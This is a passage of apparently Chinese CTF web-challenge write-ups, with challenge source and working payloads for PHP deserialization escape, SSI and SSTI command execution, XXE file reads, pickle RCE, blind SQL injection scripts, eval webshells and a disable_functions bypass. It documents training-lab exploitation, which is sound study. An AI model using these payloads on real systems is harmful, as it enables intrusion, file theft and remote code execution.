phone');\n\n\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\tdie('Invalid email');\n\t\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\tdie('Invalid nickname');\n\n\t$file = $_FILES['photo'];\n\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\tdie('Photo size error');\n\n\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t$profile['phone'] = $_POST['phone'];\n\t$profile['email'] = $_POST['email'];\n\t$profile['nickname'] = $_POST['nickname'];\n\t$profile['photo'] = 'upload/' . md5($file['name']);\n\t$user->update_profile($username, serialize($profile));\n\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\nprofile.php\n$profile = unserialize($profile);\n$phone = $profile['phone'];\t\t\n$email = $profile['email'];\n$nickname = $profile['nickname'];\n$photo = base64_encode(file_get_contents($profile['photo']));//关键，如果其中photo文件名是config.php即可读取到flag\n```\n\n反序列化字符逃逸漏洞：\n\n```\n原始序列化字符串：\na:1:{s:5:\"phone\";s:5:\"where\";}\n此时读取到的内容是phone=where\n将字符串进行过滤，preg_replace('where', 'hacker', $string);\n序列化后字符串变为\na:1:{s:5:\"phone\";s:5:\"hacker\";}\n此时反序列化只读取前5位，hacke，后面的r就属于逃逸的字符了，那么如果我们构造出一个能逃逸足够长的字符的字符串，就可以让序列化后的字符串存入我们需要的内容，在本题中我们想要传入的是s:5:\"photo\";s:10:\"config.php\";}，而又因为我们需要对nickname的内容进行绕过，此时nickname是一个数组所以我们最终需要逃逸的字符串就是\"}s:5:\"photo\";s:10:\"config.php\";}，所以最后构造payload使用关键字where，替换为hacker后能溢出，上面字符串有34个字符那么我们传入34个where+字符串即可\n```\n\npayload\n\n```\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n## [BJDCTF2020]EasySearch\n\n扫描，得到index.php.swp\n\n```PHP\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n要求password经过md5处理后前六位是6d0bc1\n\n贴一个爆破的脚本\n\n```python\nimport hashlib\nfor i in range(1000000000):\n    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n    if a[0:6] == '6d0bc1':\n        print(i)\n        print(a)\n```\n\n抓包发现响应头中\n\n```\nUrl_is_here: public/11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml\n```\n\n访问尝试XFF SSTI失败，看看wp吧，是SSI注入漏洞\n\n```\nSSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\nSSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。\n\n从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。\n```\n\n首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。\n\n**①显示服务器端环境变量<#echo>**\n\n本文档名称：\n\n`<!–#echo var=\"DOCUMENT_NAME\"–>`\n\n现在时间：\n\n`<!–#echo var=\"DATE_LOCAL\"–>`\n\n显示IP地址：\n\n`<! #echo var=\"REMOTE_ADDR\"–>`\n\n**②将文本内容直接插入到文档中<#include>**\n\n`<! #include file=\"文件名称\"–>`\n\n`<!--#include virtual=\"index.html\" -->`\n\n`<! #include virtual=\"文件名称\"–>`\n\n`<!--#include virtual=\"/www/footer.html\" -->`\n\n注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径\n\n**③显示WEB文档相关信息<#flastmod><#fsize>(如文件制作日期/大小等)**\n\n文件最近更新日期：\n\n`<! #flastmod file=\"文件名称\"–>`\n\n文件的长度：\n\n`<!–#fsize file=\"文件名称\"–>`\n\n**④直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)**\n\n`<!–#exec cmd=\"文件名称\"–>`\n\n`<!--#exec cmd=\"cat /etc/passwd\"-->`\n\n`<!–#exec cgi=\"文件名称\"–>`\n\n`<!--#exec cgi=\"/cgi-bin/access_log.cgi\"–>`\n\n将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。\n\n**⑤设置SSI信息显示格式<#config>(如文件制作日期/大小显示方式**)\n\n**⑥高级SSI可设置变量使用if条件语句。**\n\n所以我们传入`<!–#exec cmd=\"系统命令\"–>`即可执行系统命令，password内容已确定，只能通过username传入\n\n```\npayload:\nPOST\nusername=<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->&password=2020666\n```\n\n## [GYCTF2020]FlaskApp\n\n解密处SSTI\n\n过滤了*，system，os\n\n试试读取文件源码，找到了黑名单\n\n`black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]`\n\n使用加号绕过，遍历根目录\n\n`{{url_for.__globals__[\"o\"+\"s\"].listdir('/')}}`\n\n发现`this_is_the_flag.txt`文件\n\n`{{url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()}}`\n\n拿到flag\n\n## [BSidesCF 2019]Kookie\n\n```\nCookie: username=admin\n```\n\n## [极客大挑战 2019]RCE ME\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n\t$code=$_GET['code'];\n\tif(strlen($code)>40){\n\t\tdie(\"This is too Long.\");\n\t}\n\tif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n\t\tdie(\"NO.\");\n\t}\n\t@eval($code);\n}\nelse{\n\thighlight_file(__FILE__);\n}\n?>\n```\n\n取反绕过，先试试phpinfo\n\n```\ncode=(~%8F%97%8F%96%91%99%90)();\n```\n\n禁用大量系统命令执行函数，构造eval使用蚁剑\n\n```\ncode=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);\n//assert((eval($_POST[a])))\n```\n\n发现读不到flag，看wp，是一个PHP7的禁用函数绕过漏洞\n\n```\n这里用工具\n地址https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），\n```\n\n```\n然后需要构造一个新的payload:\n根据“?code=${*GET}[_](https://www.cnblogs.com/yunqian2017/p/${_GET}[_]);&*=assert&_=eval($_POST['a'])”\n使用的是异或绕过，\n最后的payload是\n```\n\n```\ncode=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/shell.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so\n```\n\n## [MRCTF2020]套娃\n\n查看源码\n\n```PHP\n$query = $_SERVER['QUERY_STRING'];\nif(substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n\tdie('Y0u are So cutE!');\n}\nif($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n\techo \"you are going to the next ~\";\n}\n```\n\n要求传参变量名为`b_u_p_t`又要求队列字符串中不能有下划线，可以使用空格绕过，而匹配起始结尾都要有23333，使用换行绕过\n\n```\n?b u p t=23333%0A\n```\n\n查看源码，发现有brainfuck注释内容，在控制台执行，发现需要POST传参Merak，传入后查看代码\n\n```PHP\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?> \n```\n\nip匹配绕过使用Client-ip请求头，file_get_contents使用data伪协议传入\n\n```\n?2333=data:text/plain,todat is a happy day&file=ZmpdYSZmXGI=\n```\n\n查看源码得到flag\n\n## [WUSTCTF2020]颜值成绩查询\n\n布尔盲注，看这题[[极客大挑战 2019]FinalSQL](#极客大挑战-2019-FinalSQL)\n\n```python\nimport requests\nurl=\"http://e3fad2bd-ba6f-41a9-bb23-275458f3c9ed.node4.buuoj.cn:81/\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'stunum':f\"1*(ascii(substr((select(group_concat(value))from(ctf.flag)),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Hi admin, your score is: 100\" in tex:\n            print(j,end='')\n            break\n```\n\n## [FBCTF2019]RCEService\n\n%0A换行截断绕过\n\n```\npayload:\ncmd={%0A\"cmd\":\"/bin/cat /home/rceservice/flag\"%0A}\n```\n\n## [Zer0pts2020]Can you guess it?\n\n先看源码\n\n```PHP\n<?php\ninclude 'config.php'; // FLAG is defined in config.php\n\nif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {\n  exit(\"I don't know what you are thinking, but I won't let you read it :)\");\n}\n\nif (isset($_GET['source'])) {\n  highlight_file(basename($_SERVER['PHP_SELF']));\n  exit();\n}\n\n$secret = bin2hex(random_bytes(64));\nif (isset($_POST['guess'])) {\n  $guess = (string) $_POST['guess'];\n  if (hash_equals($secret, $guess)) {\n    $message = 'Congratulations! The flag is: ' . FLAG;\n  } else {\n    $message = 'Wrong.';\n  }\n}\n?>\n```\n\n利用的是`basename`函数和`$_SERVER['PHP_SELF']`\n\nbasename函数会返回路径中的文件名部分，如\n\n```\nbasename(\"/var/www/html/index.php\")=index.php\n```\n\n`$_SERVER['PHP_SELF']`返回的是url中文件部分\n\n```\nhttp://127.0.0.1/test/index.php\nPHP_SELF内容就是/test/index.php\n```\n\nbasename函数有一个bug，它会去掉文件名开头的非ASCII值，所以我们构造payload在config.php最后再加一个非ascii字符即可\n\n```\npayload:\nindex.php/config.php/%FF?source\n```\n\n## [NCTF2019]Fake XML cookbook\n\n随意输入用户名密码，抓包发现内容使用xml传输，尝试构造XXE漏洞\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE note [\n<!ENTITY admin SYSTEM \"file:///etc/passwd\">\n]>\n<user><username>&admin;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03 23.20.24.png)\n\n测试回显成功\n\n猜测flag在根目录下，拿到flag\n\n## [CISCN2019 华北赛区 Day1 Web2]ikun\n\n看标题内容，提示要买LV6\n\n```\n## 爆破*站：资金募集 11540.0\nikun们冲鸭,一定要买到lv6!!!\n```\n\n写个脚本先找到LV6\n\n```python\nimport requests\nurl=\"http://14806839-f3e4-4cb2-8762-4f6d771a95b0.node4.buuoj.cn:81/shop?page=\"\nname=\"static/img/lv/lv6.png\"\ni=2\nwhile 1:\n    tex=requests.get(url+str(i)).text\n    if name in tex:\n        print(i)\n    i+=1\n```\n\n发现在181页\n\n需要的money~~太臭了不买了~~太多了，抓包更改折扣购买，而后提示该页面只允许admin访问，抓包发现JWT，找个[脚本](https://github.com/brendan-rius/c-jwt-cracker)爆破密钥\n\n爆破出的密钥为`1Kun`\n\n再在[jwt.io]()中生成新的jwt\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\n```\n\n![](https://img-blog.csdnimg.cn/1be8776440c7499882db6dfd0e32d3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZWxpZm9yc2hhcm9u,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03 23.47.04.png)\n\n看源码下载文件\n\n关键内容在sshop/views/Admin.py\n\n```python\n#Admin.py\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n\n```\n\n题目中提示了pickle，看看这是个什么东西\n\n> python的pickle模块实现了基本的数据序列和反序列化\n>\n> | 函数  | 说明                             |\n> | ----- | -------------------------------- |\n> | dumps | 对象反序列化为bytes对象          |\n> | dump  | 对象反序列化到文件对象，存入文件 |\n> | loads | 从bytes对象反序列化              |\n> | load  | 对象反序列化，从文件中读取数据   |\n\n```python\n#文件\n#序列化\npickle.dump(obj, file, protocol=None,)\nobj表示要进行封装的对象(必填参数）\nfile表示obj要写入的文件对象\n以二进制可写模式打开即wb(必填参数）\n#反序列化\npickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\nfile文件中读取封存后的对象\n以二进制可读模式打开即rb(必填参数)\n#对象\n#序列化\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。\n#反序列化\npickle.loads(bytes_object, *,fix_imports=True, encoding=\"ASCII\". errors=\"strict\")\nloads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。\n```\n\n查找后得知[pickle反序列化漏洞](https://www.freebuf.com/articles/web/252189.html)\n\n> 简而言之，pickle的loads在进行反序列化的时候会调用`__reduce__`魔术方法，也就可以利用该魔术方法构造payload\n\n命令执行例子\n\n```python\nimport pickle\nimport os\n\nclass Test2(object):\n    def __reduce__():\n    \t#被调用函数的参数\n        cmd = \"/usr/bin/id\" \n        return (os.system,(cmd,))\n\nif __name__ == \"__main__\":\n    test = Test2()\n    #执行序列化操作\n    result1 = pickle.dumps(test)\n    #执行反序列化操作\n    result2 = pickle.loads(result1)\n\n# __reduce__()魔法方法的返回值:\n# return(os.system,(cmd,))\n# 1.满足返回一个元组，元组中有两个参数\n# 2.第一个参数是被调用函数 : os.system()\n# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd\n# 4. 因此序列化时被解析执行的代码是 os.system(\"/usr/bin/id\")\n```\n\n那么就来构造个payload吧\n\n```python\n#python2\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):\n       return (eval, (\"open('/flag.txt','r').read()\",))\n\na = pickle.dumps(payload())\na = urllib.quote(a)\nprint a\n```\n\n```\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n```\n\n提交即可\n\n## [GWCTF 2019]枯燥的抽奖\n\n源码\n\n```\n<?php \n#这不是抽奖程序的源代码！不许看！ \nheader(\"Content-Type: text/html;charset=utf-8\"); \nsession_start(); \nif(!isset($_SESSION['seed'])){ \n$_SESSION['seed']=rand(0,999999999); \n} \n\nmt_srand($_SESSION['seed']); \n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; \n$str=''; \n$len1=20; \nfor ( $i = 0; $i < $len1; $i++ ){ \n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);        \n} \n$str_show = substr($str, 0, 10); \necho \"<p id='p1'>\".$str_show.\"</p>\"; \n\n\nif(isset($_POST['num'])){ \n    if($_POST['num']===$str){x \n        echo \"<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>\"; \n    } \n    else{ \n        echo \"<p id=flag>没抽中哦，再试试吧</p>\"; \n    } \n} \nshow_source(\"check.php\");\n```\n\n伪随机数漏洞，先算出需要的随机数吧\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'S5KnjyVcrs'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04 22.41.58.png)\n\n跑出来一个尝试一下\n\n```\n<?php\n#version:php7.3.4\nmt_srand(830361885);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n```\n\n成功\n\n## [CSCCTF 2019 Qual]FlaskLight\n\nSSTI\n\nconfig里面有提示\n\n```\n'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'\n```\n\n构造读文件的类咯\n\n```\nsearch={{''.__class__.__mro__[-1].__subclasses__()}}\n里面有<class 'subprocess.Popen'>，在258位\n```\n\n```\npayload:search={{''.__class__.__mro__[-1].__subclasses__()[258]('cat flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}\n```\n\n## [SUCTF 2019]Pythonginx\n\n进入就是源码\n\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname #解析出主机名\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1] #再次解析主机名\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'): #对www.example.com按.划分，先按idna编码，再utf-8解码\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost) #组合好解码后的主机名\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname #解析出主机名，要等于suctf.cc\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n搞个脚本尝试跑出最后的c中以idna编码后再经过utf8编码结果为C的内容\n\n```python\nfor i in range(128,65537):    \n    tmp=chr(i)\n    try:\n        res = tmp.encode('idna').decode('utf-8')\n        if res==\"c\":\n            print(tmp)\n    except:\n        continue\n```\n\n结果：\n\n```\nℂ\nℭ\nⅭ\nⅽ\nⒸ\nⓒ\nＣ\nｃ\n```\n\n随便拎一个构造payload，题中提示了使用了nginx，尝试访问默认nginx配置文件\n\n```\n配置文件存放目录：/etc/nginx\n主要配置文件：/etc/nginx/conf/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\nNginx配置文件：/usr/local/nginx/conf/nginx.conf\n```\n\n```\nfile://suctf.cℂ/usr/local/nginx/conf/nginx.conf\n```\n\n```\nserver {\n    listen 80;\n    location / {\n        try_files $uri @app;\n    }\n    location @app {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi.sock;\n    }\n    location /static {\n        alias /app/static;\n    }\n    # location /flag {\n    #     alias /usr/fffffflag;\n    # }\n}\n```\n\n查看flag即可\n\n```\nfile://suctf.cℂ/usr/fffffflag\n```\n\n## [NCTF2019]True XML cookbook\n\n又一个XXE，先尝试一下直接读flag吧\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///flag\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\nemmmmmm文件似乎不存在，再尝试读取网站源码，返回0没有内容，再试试PHP伪协议\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n```php\n<?php\n/**\n* autor: c0ny1\n* date: 2018-2-7\n*/\n\n$USERNAME = 'admin'; //账号\n$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码\n$result = null;\n\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\n\ntry{\n\t$dom = new DOMDocument();\n\t$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\t$creds = simplexml_import_dom($dom);\n\n\t$username = $creds->username;\n\t$password = $creds->password;\n\n\tif($username == $USERNAME && $password == $PASSWORD){\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",1,$username);\n\t}else{\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",0,$username);\n\t}\t\n}catch(Exception $e){\n\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",3,$e->getMessage());\n}\n\nheader('Content-Type: text/html; charset=utf-8');\necho $result;\n?>\n```\n\n这玩楞也妹啥用啊\n\n看看wp，拓展XXE漏洞，可以利用任意文件读取的特性来探测内网存活主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp：**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///etc/hosts\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-05 19.29.23.png)\n\n找到内网中IP，尝试在ip末尾爆破，出flag\n\n~~也不知道我这个环境有啥问题就是跑不出来，以后再试试~~\n\n## [CISCN2019 总决赛 Day2 Web1]Easyweb\n\nrobots.txt\n\n```\nDisallow: *.php.bak\n```\n\n拿到image.php源码\n\n```php\n<?php\ninclude \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\n查看源码，发现传入的id和path都将变量经过addslashes转换后的`\\0,%00,\\','`替换为空\n\n那么我们如果传入\\\\\\0，前两个反斜杠由于转义，结果是\\0，经过addslashes变为\\\\\\0，再经过str_replace变为\\，此时整个sql语句变为\n\n```mysql\nselect * from images where id='\\' or path='{$path}'\n```\n\n我们就可以在path处进行sql注入\n\n```\ntables:images,users\n```\n\n```python\nimport requests\nurl=r\"http://3658d7dc-a0eb-4cb0-a891-f66217ffe401.node4.buuoj.cn:81/image.php?id=\\\\0&path=or id=\"\nname='admin1234567890,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'\nfor i in range(1,100):\n    for j in name:\n        payload=f\"if((ascii(substr((select group_concat(password)from users),{i},1))={ord(j)}),1,0)--+\"\n        tex=requests.get(url+payload).text\n        if \"JFIF\" in tex:\n            print(j,end='')\n            break\n```\n\n在users表中获得用户名和密码`admin:157aeccdaba2cf3324cf`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06 21.43.40.png)\n\n尝试上传一句话木马，显示不允许上传php文件，上传任意文件尝试，得到提示\n\n```\nI logged the file name you uploaded to logs/upload.b6acf587d3c1a6ea213bf45c8c143b95.log.php.\n```\n\n将文件名写入log.php文件，在文件名处尝试构造木马，还是提示不能上传，看来在文件名处对php进行了过滤，尝试短标签绕过成功\n\n```\n<?= eval($_POST['kkk']);?>\n```\n\n拿flag\n\n## [RCTF2015]EasySQL\n\n进入页面发现有一个登录一个注册，怀疑是二次注入，尝试在用户名中加入单双引号测试，注册成功但是登录失败，看看wp，使用反斜杠进行测试，在修改密码处测试成功，报错回显\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06 21.58.42.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [HITCON 2017]SSRFme\n\n```PHP\n<?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\n两眼一蒙，直接[wp](https://blog.csdn.net/qq_49422880/article/details/121430262)，是新知识耶\n\n> 题目的意思是先以MD5(orange .ip)生成一个hash,放在sandbox之下，然后使用GET命令进行访问，那里就可以使用perl 进行命令执行，执行的前提是 前面必须要创建一个和这个命令一样的文件。然后呢就是将命令执行的结果放到我们传进去的文件里面。\n\n先看看根目录下有什么\n\n```\n?url=/&filename=aaa\n```\n\n看到了readflag文件，应该是要在根目录执行这个文件拿到flag了\n\n> 主要的知识点：perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠|）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。\n\n看payload\n\n```\npayload1:\n/?url=file:bash -c /readflag|&filename=bash -c /readflag|\n这一步是先将bash -c /readflag|写入名为bash -c /readflag|的文件里\npayload2:\n/?url=file:bash -c /readflag|&filename=aaa\n这一步是要执行上一步中写入的命令并把结果放入aaa文件中\npayload3:\n/sandbox/230317844a87b41e353b096d0d6a5145/aaa\n```\n\n## [CISCN2019 华北赛区 Day1 Web1]Dropbox\n\n注册->登录->上传文件->尝试下载->发现任意文件读取漏洞，查看源码\n\n```php\n//index.php\n<?php\ninclude \"class.php\";\n$a = new FileList($_SESSION['sandbox']);\n$a->Name();\n$a->Size();\n?>\n//download.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not 